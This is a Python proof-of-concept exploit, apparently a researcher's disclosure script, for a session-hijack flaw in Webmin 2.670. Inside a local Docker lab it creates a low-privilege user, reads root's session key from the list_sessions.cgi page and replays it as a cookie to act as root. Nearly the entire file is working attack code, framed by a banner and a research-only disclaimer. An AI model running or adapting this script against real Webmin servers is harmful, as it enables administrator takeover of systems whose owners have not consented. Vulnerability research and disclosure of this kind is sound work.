#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: webmin-sessiondb-cookie (Critical: 9.1)
#  Vendor: Webmin
#  Versions: Webmin 2.670
#  Impact: list_sessions prints sessiondb key; miniserv accepts it as sid
#  Requires: Docker, git, python3; two logins
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "webmin-sessiondb-cookie"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only: Webmin 2.670 list_sessions.cgi sessiondb key is a live sid."""

import http.cookiejar
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path

LABEL = "WEBMIN-H27-SESSIONDB"
WITNESS = "WEBMIN-H27-SESSION-KEY"
IMAGE = "webmin-lab:2.670"
PIN = "2.670"
HOST = "127.0.0.1"
PORT = 18440
BASE = f"http://{HOST}:{PORT}"
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "webminh27")
HERE = Path(__file__).resolve().parent
SERVICE = "webmin"
ROOT_USER = "root"
ROOT_PASS = "labroot"
LIMITED_USER = "limited"
LIMITED_PASS = "LabLimited1"
SWITCH_DENIED = "You are not allowed to switch to this user"
EDIT_DENIED = "You are not allowed to edit this user"
EDIT_TITLE = "Edit Webmin User"

ROW_RE = re.compile(
    r"<tr[^>]*class=['\"][^'\"]*ui_columns_row[^'\"]*['\"][^>]*>(.*?)</tr>",
    re.I | re.S,
)
KEY_RE = re.compile(r"<tt>([0-9a-f]{16,})</tt>", re.I)
ROOT_RE = re.compile(r"user=root(?:['\"&]|$)|>root<", re.I)


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    headers: dict[str, str]
    url: str


class _PassHTTPError(urllib.request.HTTPErrorProcessor):
    def http_response(self, request: urllib.request.Request, response: object) -> object:
        return response

    https_response = http_response


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> str:
    return f"FAIL {LABEL} {reason} {WITNESS}"


def clip(text: str, limit: int = 240) -> str:
    compact = " ".join((text or "").split())
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def compose_exec(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return compose("exec", "-T", SERVICE, *args, timeout=timeout)


def header_get(headers: dict[str, str], name: str) -> str:
    want = name.lower()
    for key, value in headers.items():
        if key.lower() == want:
            return value
    return ""


class Client:
    def __init__(self) -> None:
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar),
            _PassHTTPError,
        )
        self.last_url = f"{BASE}/session_login.cgi"
        self.forced_cookie = ""

    def sid(self) -> str:
        for cookie in self.jar:
            if cookie.name == "sid" and cookie.value and cookie.value != "x":
                return cookie.value
        return ""

    def request(
        self,
        method: str,
        url: str,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
        timeout: int = 30,
    ) -> HttpResult:
        abs_url = urllib.parse.urljoin(self.last_url, url)
        hdrs = {
            "User-Agent": "H27SessionLab/1.0",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Origin": BASE,
            "Referer": self.last_url,
        }
        if self.forced_cookie:
            hdrs["Cookie"] = self.forced_cookie
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(abs_url, data=data, headers=hdrs, method=method)
        try:
            with self.opener.open(req, timeout=timeout) as resp:
                raw = resp.read()
                status = int(getattr(resp, "status", 0) or 0)
                final = str(resp.geturl() or abs_url)
                hdr = {k.lower(): v for k, v in resp.headers.items()}
        except urllib.error.HTTPError as exc:
            raw = exc.read() if exc.fp else b""
            status = int(exc.code)
            final = abs_url
            hdr = {k.lower(): v for k, v in (exc.headers.items() if exc.headers else [])}
        except urllib.error.URLError as exc:
            return HttpResult(0, clip(str(exc.reason)), {}, abs_url)
        body = raw.decode("utf-8", "replace") if raw else ""
        if final:
            self.last_url = final
        return HttpResult(status, body, hdr, final)

    def get(self, path: str, referer: str | None = None) -> HttpResult:
        extra = {"Referer": referer} if referer else None
        return self.request("GET", path, headers=extra)

    def post_form(self, path: str, fields: dict[str, str], referer: str | None = None) -> HttpResult:
        payload = urllib.parse.urlencode(fields).encode("utf-8")
        extra = {"Content-Type": "application/x-www-form-urlencoded"}
        if referer:
            extra["Referer"] = referer
        return self.request("POST", path, data=payload, headers=extra)


def expect_ok(proc: subprocess.CompletedProcess[str], prefix: str) -> str | None:
    if proc.returncode != 0:
        err = clip((proc.stderr or "") + " " + (proc.stdout or ""))
        return f"{prefix}-rc-{proc.returncode}-{err}"
    return None


def plant_limited() -> str | None:
    script = r"""
set -euo pipefail
perl -MDigest::SHA=hmac_sha256_hex -e 'hmac_sha256_hex("x","y")' >/dev/null
HASH=$(perl -e 'print crypt($ARGV[0], "\$6\$wmnlab99")' "LabLimited1")
if ! grep -q '^limited:' /etc/webmin/miniserv.users; then
  printf 'limited:%s:0\n' "$HASH" >> /etc/webmin/miniserv.users
fi
if ! grep -q '^limited:' /etc/webmin/webmin.acl; then
  printf 'limited: acl\n' >> /etc/webmin/webmin.acl
fi
cat > /etc/webmin/acl/limited.acl <<'EOF'
users=~
mode=1
create=0
delete=0
rename=0
others=0
acl=0
sessions=1
switch=0
groups=0
gassign=
EOF
chmod 600 /etc/webmin/miniserv.users /etc/webmin/webmin.acl
chmod 640 /etc/webmin/acl/limited.acl
if grep -q '^session_ip=' /etc/webmin/miniserv.conf; then
  sed -i '/^session_ip=/d' /etc/webmin/miniserv.conf
fi
pidfile=$(sed -n 's/^pidfile=//p' /etc/webmin/miniserv.conf)
kill -USR1 "$(cat "$pidfile")"
"""
    planted = compose("exec", "-T", SERVICE, "bash", "-lc", script)
    err = expect_ok(planted, "plant-limited")
    if err:
        return err
    time.sleep(1)
    return None


def login(client: Client, user: str, password: str) -> str | None:
    login_url = f"{BASE}/session_login.cgi"
    form = client.get(login_url)
    if form.status not in (200, 401):
        return f"login-form-{user}-{form.status}"
    testing = any(c.name == "testing" and c.value == "1" for c in client.jar)
    if not testing:
        return f"testing-cookie-missing-{user}"
    posted = client.post_form(
        login_url,
        {"user": user, "pass": password, "page": "/"},
        referer=login_url,
    )
    if posted.status in (301, 302, 303, 307, 308):
        loc = header_get(posted.headers, "location")
        if loc:
            client.get(loc, referer=login_url)
    if not client.sid():
        return f"sid-missing-{user}-status-{posted.status}"
    return None


def root_session_key(html: str) -> str:
    for row in ROW_RE.findall(html):
        if "This login" in row:
            continue
        if not ROOT_RE.search(row):
            continue
        match = KEY_RE.search(row)
        if match:
            return match.group(1)
    return ""


def is_root_identity(body: str) -> bool:
    if EDIT_DENIED in body or SWITCH_DENIED in body:
        return False
    if EDIT_TITLE not in body:
        return False
    return bool(re.search(r'name=["\']name["\'][^>]*value=["\']root["\']', body, re.I)) or bool(
        re.search(r'value=["\']root["\'][^>]*name=["\']name["\']', body, re.I)
    )


def main() -> int:
    lines: list[str] = []

    def note(msg: str) -> None:
        log(msg)
        lines.append(msg)

    def finish(last: str) -> int:
        log(last)
        lines.append(last)
        (HERE / "poc-last-run.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
        return 0 if last.startswith("SUCCESS ") else 1

    try:
        inspect = subprocess.run(
            ["docker", "image", "inspect", IMAGE, "--format", "{{.Id}}"],
            capture_output=True,
            text=True,
            check=False,
        )
        note(f"IOC image={IMAGE} pin={PIN} id={clip(inspect.stdout or 'missing', 80)}")

        planted = plant_limited()
        if planted:
            return finish(fail(planted))
        acl = compose_exec("bash", "-lc", "grep -E '^(users|sessions|switch)=' /etc/webmin/acl/limited.acl")
        sip = compose_exec(
            "bash",
            "-lc",
            "grep '^session_ip=' /etc/webmin/miniserv.conf || echo session_ip=off",
        )
        note(f"IOC limited-acl {clip(acl.stdout or acl.stderr or '')}")
        note(f"IOC session_ip {clip(sip.stdout or sip.stderr or '')}")

        root = Client()
        login_err = login(root, ROOT_USER, ROOT_PASS)
        if login_err:
            return finish(fail(login_err))
        note(f"IOC login user={ROOT_USER} sid={root.sid()[:12]}")

        limited = Client()
        login_err = login(limited, LIMITED_USER, LIMITED_PASS)
        if login_err:
            return finish(fail(login_err))
        note(f"IOC login user={LIMITED_USER} sid={limited.sid()[:12]}")

        switch = limited.get(
            f"{BASE}/acl/switch.cgi?user=root",
            referer=f"{BASE}/acl/edit_user.cgi?user=root",
        )
        note(f"IOC switch.cgi status={switch.status} body={clip(switch.body)}")
        if SWITCH_DENIED not in switch.body:
            return finish(fail(f"switch-not-denied-{switch.status}"))

        edit = limited.get(
            f"{BASE}/acl/edit_user.cgi?user=root",
            referer=f"{BASE}/acl/",
        )
        note(f"IOC edit_user root-as-limited status={edit.status} denied={int(EDIT_DENIED in edit.body)}")
        if EDIT_DENIED not in edit.body:
            return finish(fail("edit-root-not-denied"))

        listed = limited.get(
            f"{BASE}/acl/list_sessions.cgi",
            referer=f"{BASE}/acl/",
        )
        note(f"IOC list_sessions status={listed.status} body={clip(listed.body)}")
        if listed.status != 200:
            return finish(fail(f"list-sessions-{listed.status}"))
        key = root_session_key(listed.body)
        if not key:
            return finish(fail("root-session-key-missing"))
        if key == limited.sid():
            return finish(fail("key-is-limited-cookie"))
        note(f"IOC stolen-key len={len(key)} hex={key[:16]}")

        stolen = Client()
        stolen.forced_cookie = f"sid={key}"
        stolen.jar.clear()
        who = stolen.get(
            f"{BASE}/acl/edit_user.cgi?user=root",
            referer=f"{BASE}/acl/",
        )
        note(f"IOC replay status={who.status} body={clip(who.body)}")
        if who.status != 200:
            return finish(fail(f"replay-status-{who.status}"))
        if not is_root_identity(who.body):
            return finish(fail("replay-not-root"))
        return finish(f"SUCCESS {LABEL} list_sessions.cgi sid=sessiondb-key became-root {WITNESS}")
    except OSError:
        return finish(fail("os-error"))
    except subprocess.TimeoutExpired:
        return finish(fail("timeout"))


if __name__ == "__main__":
    raise SystemExit(main())

